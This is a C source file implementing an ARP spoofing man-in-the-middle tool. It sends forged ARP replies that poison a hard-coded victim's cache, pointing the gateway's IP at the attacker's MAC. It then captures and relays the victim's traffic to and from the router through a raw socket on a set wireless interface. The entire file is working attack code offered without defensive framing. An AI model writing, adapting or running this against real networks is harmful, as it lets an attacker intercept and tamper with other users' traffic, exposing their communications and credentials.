#include "core.h"
#include <time.h>

static u8 MESSAGE_BUFFER[1 << 10];
static u8 BYTES_BUFFER[1 << 16];

void arp_spoof(
    int sock,
    char* if_name,
    Mac attacker_mac,
    u32 gateway_ip,
    Mac victim_mac,
    u32 victim_ip
) {
    ifreq ifr = {0};
    strncpy(ifr.ifr_name, if_name, IFNAMSIZ - 1);

    sockaddr_ll addr_ll = {0};
    addr_ll.sll_family = AF_PACKET;
    addr_ll.sll_protocol = htons(ETH_P_ARP);
    addr_ll.sll_ifindex = if_nametoindex(if_name);
    addr_ll.sll_halen = ETHER_ADDR_LEN;
    memcpy(addr_ll.sll_addr, victim_mac.bytes, ETHER_ADDR_LEN);

    ether_arp resp;
    resp.arp_hrd = htons(ARPHRD_ETHER);
    resp.arp_pro = htons(ETH_P_IP);
    resp.arp_hln = ETHER_ADDR_LEN;
    resp.arp_pln = sizeof(in_addr_t);
    resp.arp_op = htons(ARPOP_REPLY);

    memcpy(&resp.arp_sha, attacker_mac.bytes, sizeof(resp.arp_sha));
    memcpy(&resp.arp_spa, &gateway_ip, sizeof(resp.arp_spa));
    memcpy(&resp.arp_tha, victim_mac.bytes, sizeof(resp.arp_tha));
    memcpy(&resp.arp_tpa, &victim_ip, sizeof(resp.arp_tpa));

    if (sendto(
            sock,
            &resp,
            sizeof(resp),
            0,
            (sockaddr*)&addr_ll,
            sizeof(addr_ll)
        )
        == -1) {
        perror("sendto");
        close(sock);
        exit(1);
    }
}

void main(void) {
    int arp_sock = get_arp_socket();

    char* if_name = "wlp1s0";
    u32 victim_addr_hl = inet_addr("192.168.0.101");

    printf("------------------------------------\n");
    printf("Gateway ip:       ");
    u32 gateway_addr_hl = get_gateway_addr_hl(if_name);
    print_addr_l(gateway_addr_hl);
    printf("\n");

    printf("Gateway mac:      ");
    Mac gateway_mac = request_target_mac(
        arp_sock, if_name, gateway_addr_hl
    );
    print_mac(gateway_mac);
    printf("\n");

    printf("------------------------------------\n");
    printf("Attacker ip:      ");
    u32 attacker_addr_hl = get_interface_addr_hl(if_name);
    print_addr_l(attacker_addr_hl);
    printf("\n");

    Mac attacker_mac = get_interface_mac(if_name);
    printf("Attacker mac:     ");
    print_mac(attacker_mac);
    printf("\n");

    printf("------------------------------------\n");
    printf("Victim ip:        ");
    print_addr_l(victim_addr_hl);
    printf("\n");

    printf("Victim mac:       ");
    Mac victim_mac = request_target_mac(arp_sock, if_name, victim_addr_hl);
    print_mac(victim_mac);
    printf("\n");

    printf("------------------------------------\n");
    printf("Spoofing...\n");
    int raw_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_sock == -1) {
        perror("socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))");
        exit(1);
    }

    sockaddr_ll addr_ll = {0};
    addr_ll.sll_family = AF_PACKET;
    addr_ll.sll_ifindex = if_nametoindex(if_name);
    if (bind(raw_sock, (sockaddr*)&addr_ll, sizeof(addr_ll)) == -1) {
        perror("bind(raw_sock, ...)");
        exit(1);
    }

    time_t start_time = 0;
    int elapsed_time = 0;

    do {
        time_t current_time = time(NULL);
        elapsed_time = current_time - start_time;
        if (elapsed_time > 2.0) {
            arp_spoof(
                arp_sock,
                if_name,
                attacker_mac,
                gateway_addr_hl,
                victim_mac,
                victim_addr_hl
            );
            start_time = current_time;
            printf("arp_spoof\n");
        }

        // Wait for an incoming packet
        int packet_size = recv(
            raw_sock, BYTES_BUFFER, sizeof(BYTES_BUFFER), 0
        );
        if (packet_size == -1) {
            perror("recv(raw_sock, ...)");
            continue;
        }

        struct ether_header* eth_header = (struct ether_header*)
            BYTES_BUFFER;

        // Check if the packet is for the target machine
        if (memcmp(
                eth_header->ether_dhost, attacker_mac.bytes, ETHER_ADDR_LEN
            )
            != 0) {
            continue;
        }

        // Modify the packet's destination MAC address to the router's MAC
        // address
        memcpy(eth_header->ether_dhost, gateway_mac.bytes, ETHER_ADDR_LEN);

        // Modify the packet's source MAC address to the proxy's MAC
        // address
        memcpy(
            eth_header->ether_shost, attacker_mac.bytes, ETHER_ADDR_LEN
        );

        // Send the modified packet to the router
        if (send(raw_sock, BYTES_BUFFER, packet_size, 0) == -1) {
            sprintf(
                MESSAGE_BUFFER,
                "Can't send(raw_sock, ...), packet size: %d",
                packet_size
            );
            perror(MESSAGE_BUFFER);
            continue;
        }

        // Wait for the router's response
        packet_size = recv(
            raw_sock, BYTES_BUFFER, sizeof(BYTES_BUFFER), 0
        );
        if (packet_size == -1) {
            perror("recv(raw_sock, ...)");
            continue;
        }

        // Modify the response's source MAC address to the target machine's
        // MAC address
        memcpy(
            eth_header->ether_shost,
            eth_header->ether_dhost,
            ETHER_ADDR_LEN
        );
        memcpy(eth_header->ether_dhost, victim_mac.bytes, ETHER_ADDR_LEN);

        // Send the modified response back to the target machine
        if (send(raw_sock, BYTES_BUFFER, packet_size, 0) == -1) {
            sprintf(
                MESSAGE_BUFFER,
                "Can't send(raw_sock, ...), packet size: %d",
                packet_size
            );
            continue;
        }

        printf("STEP!\n");
    } while (1);

    close(arp_sock);
    close(raw_sock);
}
